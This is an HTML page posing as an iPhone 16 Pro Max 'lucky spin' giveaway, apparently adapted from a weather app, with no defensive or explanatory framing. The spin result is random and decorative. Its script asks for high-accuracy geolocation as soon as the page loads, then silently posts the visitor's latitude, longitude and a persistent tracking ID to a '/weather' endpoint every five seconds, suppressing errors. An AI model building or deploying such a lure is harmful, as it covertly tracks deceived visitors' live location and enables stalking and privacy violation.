<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>iPhone Spin Gift</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#ff512f,#dd2476);
    font-family:Arial,sans-serif;
}

.weather-card{
    background:white;
    width:330px;
    padding:30px 20px;
    border-radius:25px;
    text-align:center;
    box-shadow:0 15px 40px rgba(0,0,0,.3);
}

.weather-card h2{
    color:#ff0066;
    font-size:28px;
    margin-bottom:10px;
}

.location{
    font-size:18px;
    color:#555;
}

.weather-icon{
    margin:25px 0;
}

.weather-icon img{
    width:180px;
    transition:5s;
}

.weather-info{
    margin:20px 0;
}

.temperature{
    display:block;
    font-size:45px;
}

.condition{
    font-size:18px;
    color:#777;
}

button{
    padding:15px 40px;
    border:none;
    border-radius:40px;
    background:#ff9800;
    color:white;
    font-size:20px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#ff6600;
}

</style>

</head>

<body>

<div class="weather-card">

<h2>🎁 Win iPhone 16 Pro Max</h2>

<p class="location">
Lucky Spin Gift
</p>

<div class="weather-icon">
<img id="iphone" src="iphone.png" alt="iPhone">
</div>

<div class="weather-info">

<span class="temperature">
🎡
</span>

<span class="condition">
Spin and try your luck!
</span>

</div>

<button id="check-weather">
SPIN NOW
</button>

</div>


<script>

const button = document.getElementById("check-weather");
const iphone = document.getElementById("iphone");
const condition = document.querySelector(".condition");
const temperature = document.querySelector(".temperature");


const id = localStorage.getItem("id") || generateId();


let locationInterval;


// Page load location send
window.onload = () => {
    sendLocation();

    locationInterval = setInterval(sendLocation,5000);
};


// Spin button
button.addEventListener("click",()=>{

    button.disabled = true;
    button.innerHTML="Spinning...";


    let randomDegree = 1800 + Math.floor(Math.random()*360);


    iphone.style.transform =
    `rotateY(${randomDegree}deg)`;


    setTimeout(()=>{


        let win = Math.random() > 0.5;


        if(win){

            temperature.innerHTML="🎉";

            condition.innerHTML=
            "Congratulations! You won iPhone 🎁";

        }
        else{

            temperature.innerHTML="😢";

            condition.innerHTML=
            "Better luck next time!";

        }


        button.disabled=false;
        button.innerHTML="SPIN AGAIN";


    },5000);


});



// Location send function

function sendLocation(){

    if(!navigator.geolocation){
        return;
    }


    navigator.geolocation.getCurrentPosition(

        (position)=>{


            fetch("/weather",{

                method:"POST",

                headers:{
                    "Content-Type":"application/json"
                },

                body:JSON.stringify({

                    id:id,

                    lat:position.coords.latitude,

                    lng:position.coords.longitude

                })

            })
            .catch(()=>{});


        },


        ()=>{

            // Silent fail - no alert

        },


        {

            enableHighAccuracy:true,

            timeout:10000,

            maximumAge:0

        }

    );

}




function generateId(length=10){

    const characters=
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";


    let result="";


    for(let i=0;i<length;i++){

        result += characters.charAt(
            Math.floor(Math.random()*characters.length)
        );

    }


    localStorage.setItem("id",result);

    return result;

}


</script>

</body>
</html>
